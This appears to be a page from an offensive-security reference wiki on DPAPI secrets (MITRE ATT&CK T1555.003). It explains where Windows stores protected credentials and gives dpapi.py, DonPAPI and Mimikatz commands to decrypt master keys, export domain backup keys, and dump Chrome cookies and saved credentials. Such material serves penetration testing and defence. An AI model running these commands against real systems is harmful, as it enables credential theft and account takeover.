---
description: MITRE ATT&CK™ Sub-technique T1555.003
---

# DPAPI secrets

## Theory

The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at:

```bash
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
```

Application like Google Chrome, Outlook, Internet Explorer, Skype use the DPAPI. Windows also uses that API for sensitive information like Wi-Fi passwords, certificates, RDP connection passwords, and many more.

Below are common paths of hidden files that usually contain DPAPI-protected data.

```bash
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
```

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, DPAPI-data can be manipulated (mainly offline) with tools like [dpapick](https://github.com/jordanbtucker/dpapick) (Python), [dpapilab](https://github.com/dfirfpi/dpapilab) (Python), [Impacket](https://github.com/SecureAuthCorp/impacket)'s [dpapi.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dpapi.py) and [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python).

```bash
# (not tested) Decrypt a master key
dpapi.py masterkey -file "/path/to/masterkey_file" -sid $USER_SID -password $MASTERKEY_PASSWORD

# (not tested) Obtain the backup keys & use it to decrypt a master key
dpapi.py backupkeys -t $DOMAIN/$USER:$PASSWORD@$TARGET
dpapi.py masterkey -file "/path/to/masterkey_file" -pvk "/path/to/backup_key.pvk"

# (not tested) Decrypt DPAPI-protected data using a master key
dpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY
```

[DonPAPI](https://github.com/login-securite/DonPAPI) (Python) can also be used to remotely extract a user's DPAPI secrets more easily. It supports [pass-the-hash](../../ntlm/pth.md), [pass-the-ticket](../../kerberos/ptt.md) and so on.

```bash
DonPAPI.py 'domain'/'username':'password'@<'targetName' or 'address/mask'>
```
{% endtab %}

{% tab title="Windows" %}
On Windows systems [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C) can be used to extract dpapi with [`lsadump::backupkeys`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/backupkeys), decrypt with [`dpapi::chrome`](https://tools.thehacker.recipes/mimikatz/modules/dpapi/chrome) and [`dpapi::cred`](https://tools.thehacker.recipes/mimikatz/modules/dpapi/cred) or use specific master keys with [`dpapi::masterkey`](https://tools.thehacker.recipes/mimikatz/modules/dpapi/masterkey) and [`sekurlsa::dpapi`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/dpapi) , using specified passwords or given sufficient privileges.

```bash
# Extract and decrypt a master key
dpapi::masterkey /in:"C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID" /sid:$SID /password:$PASSWORD /protected

# Extract and decrypt all master keys
sekurlsa::dpapi

# Extract the backup keys & use it to decrypt a master key
lsadump::backupkeys /system:$DOMAIN_CONTROLLER /export
dpapi::masterkey /in:"C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID" /pvk:$BACKUP_KEY_EXPORT_PVK

# Decrypt Chrome data
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies"

# Decrypt DPAPI-protected data using a master key
dpapi::cred /in:"C:\path\to\encrypted\file" /masterkey:$MASTERKEY
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords" %}

{% embed url="https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf" %}
